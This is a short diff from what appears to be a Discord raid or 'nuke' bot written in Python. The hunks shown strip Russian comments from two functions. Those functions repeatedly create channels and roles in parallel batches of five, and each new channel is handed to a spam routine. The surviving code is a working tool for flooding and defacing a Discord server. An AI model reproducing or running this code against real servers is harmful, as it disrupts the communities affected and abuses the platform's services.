@@ -86,7 +86,7 @@ async def change_server_name(guild):
 async def create_and_spam_channels(guild):
     global stop_spam
     while not stop_spam:
-        tasks = [guild.create_text_channel(config.CHANNEL_NAME) for _ in range(5)]  # создаем 5 каналов одновременно
+        tasks = [guild.create_text_channel(config.CHANNEL_NAME) for _ in range(5)]
         channels = await asyncio.gather(*tasks)
         for channel in channels:
             asyncio.create_task(spam_channel(channel, guild))
@@ -102,7 +102,7 @@ async def spam_channel(channel, guild):
 async def create_roles(guild):
     global stop_spam
     while not stop_spam:
-        tasks = [guild.create_role(name=config.ROLE_NAME) for _ in range(5)]  # создаем 5 ролей одновременно
+        tasks = [guild.create_role(name=config.ROLE_NAME) for _ in range(5)]
         await asyncio.gather(*tasks)
     await asyncio.sleep(config.COOLDOWN)
 
